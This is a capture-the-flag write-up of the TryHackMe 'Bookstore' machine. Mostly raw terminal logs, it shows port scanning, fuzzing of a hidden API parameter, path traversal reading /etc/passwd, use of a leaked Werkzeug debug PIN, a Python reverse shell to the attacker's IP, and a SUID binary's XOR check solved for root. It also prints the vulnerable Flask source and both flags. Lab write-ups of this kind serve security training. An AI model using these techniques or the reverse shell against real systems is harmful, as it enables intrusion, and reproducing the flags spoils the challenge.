----
A Beginner level box with basic web enumeration and REST API Fuzzing.
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/aba19a5cfea503b401f5550cb1004e20.jpeg)

### Bookstore

 Start Machine

Bookstore is a boot2root CTF machine that teaches a beginner penetration tester basic web enumeration and REST API Fuzzing. Several hints can be found when enumerating the services, the idea is to understand how a vulnerable API can be exploited, you can contact me on twitter @siddhantc_ for giving any feedback regarding the machine.  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.126.184 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.126.184:22
Open 10.10.126.184:80
Open 10.10.126.184:5000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 12:14 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:14
Completed Parallel DNS resolution of 1 host. at 12:14, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:14
Scanning 10.10.126.184 [3 ports]
Discovered open port 80/tcp on 10.10.126.184
Discovered open port 22/tcp on 10.10.126.184
Discovered open port 5000/tcp on 10.10.126.184
Completed Connect Scan at 12:14, 0.19s elapsed (3 total ports)
Initiating Service scan at 12:14
Scanning 3 services on 10.10.126.184
Completed Service scan at 12:14, 6.80s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.126.184.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 7.29s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.81s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
Nmap scan report for 10.10.126.184
Host is up, received user-set (0.19s latency).
Scanned at 2023-04-16 12:14:23 EDT for 15s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 440e60ab1e865b442851db3f9b122177 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCs5RybjdxaxapwkXwbzqZqONeX4X8rYtfTsy7wey7ZeRNsl36qQWhTrurBWWnYPO7wn2nEQ7Iz0+tmvSI3hms3eIEufCC/2FEftezKhtP1s4/qjp8UmRdaewMW2zYg+UDmn9QYmRfbBH80CLQvBwlsibEi3aLvhi/YrNCzL5yxMFQNWHIEMIry/FK1aSbMj7DEXTRnk5R3CYg3/OX1k3ssy7GlXAcvt5QyfmQQKfwpOG7UM9M8mXDCMiTGlvgx6dJkbG0XI81ho2yMlcDEZ/AsXaDPAKbH+RW5FsC5R1ft9PhRnaIkUoPwCLKl8Tp6YFSPcANVFYwTxtdUReU3QaF9
|   256 592f70769f65abdc0c7dc1a2a34de640 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCbhAKUo1OeBOX5j9stuJkgBBmhTJ+zWZIRZyNDaSCxG6U817W85c9TV1oWw/A0TosCyr73Mn73BiyGAxis6lNQ=
|   256 109f0bddd64dc77a3dff52421d296eba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAr3xDLg8D5BpJSRh8OgBRPhvxNSPERedYUTJkjDs/jc
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Book Store
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
5000/tcp open  http    syn-ack Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.14 seconds

http://10.10.126.184:5000/robots.txt
http://10.10.126.184:5000/api
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.126.184:5000/ -i200,302,401 -w /usr/share/wordlists/dirb/common.txt                         

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/10.10.126.184-5000/-_23-04-16_12-37-04.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-04-16_12-37-04.log

Target: http://10.10.126.184:5000/

[12:37:05] Starting: 
[12:37:15] 200 -  825B  - /api
[12:37:25] 200 -    2KB - /console (is locked)

trying v1

http://10.10.126.184:5000/api/v1/resources/books?id=../../../../../../../etc/passwd

fuzzing params

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u http://10.10.126.184:5000/api/v1/resources/books\?FUZZ\=../../../../../../../etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,503           
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.126.184:5000/api/v1/resources/books?FUZZ=../../../../../../../etc/passwd
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload           
=====================================================================

000000395:   200        30 L     38 W       1555 Ch     "show"    (found it)        
000000486:   200        1 L      1 W        3 Ch        "author"          
000000529:   200        1 L      1 W        3 Ch        "id"  

http://10.10.126.184:5000/api/v1/resources/books?show=../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 

http://10.10.126.184:5000/api/v1/resources/books?show=.bash_history

cd /home/sid whoami export WERKZEUG_DEBUG_PIN=123-321-135 echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit 

found pin 123-321-135
http://10.10.126.184:5000/console

revshell

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.126.184] 50040
sid@bookstore:~$ whoami
whoami
sid
sid@bookstore:~$ cat user.txt
cat user.txt
4ea65eb80ed441adb68246ddf7b964ab
sid@bookstore:~$ cat api.py
cat api.py
import flask
from flask import request, jsonify
from flask_cors import CORS, cross_origin
import sqlite3
import os
import subprocess


app = flask.Flask(__name__)
cors = CORS(app)
app.config["DEBUG"] = True
app.config['CORS_HEADERS'] = 'Content-Type'


def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d


@app.route('/', methods=['GET'])
def home():
    return '''
    <title>Home</title>
    <h1>Foxy REST API v2.0</h1>
    <p>This is a REST API for science fiction novels.</p>
 '''

@app.route('/api', methods=['GET'])
def documentation():
    return '''
	<title>API Documentation</title>
	<h1>API Documentation</h1>
	<h3>Since every good API has a documentation we have one as well!</h3>
	<h2>The various routes this API currently provides are:</h2><br>
	<p>/api/v2/resources/books/all (Retrieve all books and get the output in a json format)</p>
	<p>/api/v2/resources/books/random4 (Retrieve 4 random records)</p>
	<p>/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)</p>
	<p>/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)</p>
	<p>/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)</p>
	<p>/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)</p>
 '''

@app.route('/api/', methods=['GET'])
def same():
    return documentation()

@app.route('/robots.txt', methods=['GET'])
def robots():
    return '''<p>User-agent: *<br><br>
Disallow: /api </p> '''


@app.route('/api/v1/resources/books/all', methods=['GET'])
def api_all():
    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()
    all_books = cur.execute('SELECT * FROM books;').fetchall()

    return jsonify(all_books)

@app.route('/api/v2/resources/books/all', methods=['GET'])
def api_allv2():
    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()
    all_books = cur.execute('SELECT * FROM books;').fetchall()

    return jsonify(all_books)

@app.route('/api/v2/resources/books/random4', methods=['GET'])
def api_random10():
    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()
    all_books = cur.execute('SELECT * FROM books order by random() LIMIT 4;').fetchall()

    return jsonify(all_books)



@app.errorhandler(404)
def page_not_found(e):
    return '''<h1>404</h1>
    <p>The resource requested could not be found.</p>''', 404

@app.route('/api/v2/resources/books', methods=['GET'])
def api_filterv2():
    query_parameters = request.args

    id = query_parameters.get('id')
    published = query_parameters.get('published')
    author = query_parameters.get('author')


    query = "SELECT * FROM books WHERE"
    to_filter = []

    if id:
        query += ' id=? AND'
        to_filter.append(id)
    if published:
        query += ' published=? AND'
        to_filter.append(published)
    if author:
        query += ' author=? AND'
        to_filter.append(author)

    if not (id or published or author):
        return page_not_found(404)

    query = query[:-4] + ';'

    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()

    results = cur.execute(query, to_filter).fetchall()

    return jsonify(results)


@app.route('/api/v1/resources/books', methods=['GET'])
def api_filter():
    query_parameters = request.args

    id = query_parameters.get('id')
    published = query_parameters.get('published')
    author = query_parameters.get('author')
    show  = query_parameters.get('show')

    query = "SELECT * FROM books WHERE"
    to_filter = []

    if id:
        query += ' id=? AND'
        to_filter.append(id)
    if published:
        query += ' published=? AND'
        to_filter.append(published)
    if author:
        query += ' author=? AND'
        to_filter.append(author)
    if show:
        try:
                with open(show, 'r') as f:
                        return f.read()
        except:
                return filename

    if not (id or published or author):
        return page_not_found(404)

    query = query[:-4] + ';'

    conn = sqlite3.connect('books.db')
    conn.row_factory = dict_factory
    cur = conn.cursor()

    results = cur.execute(query, to_filter).fetchall()

    return jsonify(results)

print(getattr(app, '__name__', getattr(app.__class__, '__name__')))

app.run(host='0.0.0.0', port=5000, debug = True)

sid@bookstore:~$ ls -lah
ls -lah
total 80K
drwxr-xr-x 5 sid  sid  4.0K Oct 20  2020 .
drwxr-xr-x 3 root root 4.0K Oct 20  2020 ..
-r--r--r-- 1 sid  sid  4.6K Oct 20  2020 api.py
-r-xr-xr-x 1 sid  sid   160 Oct 14  2020 api-up.sh
-r--r----- 1 sid  sid   116 Apr 16 22:08 .bash_history
-rw-r--r-- 1 sid  sid   220 Oct 20  2020 .bash_logout
-rw-r--r-- 1 sid  sid  3.7K Oct 20  2020 .bashrc
-rw-rw-r-- 1 sid  sid   16K Oct 19  2020 books.db
drwx------ 2 sid  sid  4.0K Oct 20  2020 .cache
drwx------ 3 sid  sid  4.0K Oct 20  2020 .gnupg
drwxrwxr-x 3 sid  sid  4.0K Oct 20  2020 .local
-rw-r--r-- 1 sid  sid   807 Oct 20  2020 .profile
-rwsrwsr-x 1 root sid  8.3K Oct 20  2020 try-harder
-r--r----- 1 sid  sid    33 Oct 15  2020 user.txt
sid@bookstore:~$ cat api-up.sh
cat api-up.sh
#!/bin/bash
if ps -a |grep 'api.py';then
	echo 'API is up';
else
	export WERKZEUG_DEBUG_PIN=123-321-135
	cd /home/sid && /usr/bin/python3  /home/sid/api.py
fi

sid@bookstore:~$ ./try-harder
./try-harder
What's The Magic Number?!
123
123
Incorrect Try Harder

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337 > try-harder
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.126.184] 50042

sid@bookstore:~$ nc 10.8.19.103 1337 < try-harder
┌──(witty㉿kali)-[~/Downloads]
└─$ file try-harder 
try-harder: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped

using ghidra

void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

from base16 local_14 == 0x5dcd21f4 == 1573724660
			local_18 == 0x5db3 == 23987
			0x1116 == 4374

so 1573724660 = local_1c ^ 4374 ^ 23987

we just need to 1573724660 ^ 4374 ^ 23987  to get local_1c number :)

https://xor.pw/         1573728482 ^ 23987 = 1573743953

sid@bookstore:~$ ./try-harder
./try-harder
What's The Magic Number?!
1573743953
root@bookstore:~# cd /root
cd /root
root@bookstore:/root# ls
ls
root.txt  s
root@bookstore:/root# cat root.txt
cat root.txt
e29b05fba5b2a7e69c24a450893158e3
root@bookstore:/root# cd s
cd s
root@bookstore:/root/s# ls
ls
root@bookstore:/root/s# ls -lah
ls -lah
total 12K
drwxr-xr-x 2 sid  sid  4.0K Oct 20  2020 .
drwx------ 6 root root 4.0K Oct 20  2020 ..
-r-------- 1 sid  sid   116 Oct 20  2020 .bash_history
root@bookstore:/root/s# cat .bash_history
cat .bash_history
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=123-321-135
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit



```

![[Pasted image 20230416113822.png]]

![[Pasted image 20230416120917.png]]

User flag  

*4ea65eb80ed441adb68246ddf7b964ab*

Root flag

*e29b05fba5b2a7e69c24a450893158e3*

[[Advent of Cyber 2022]]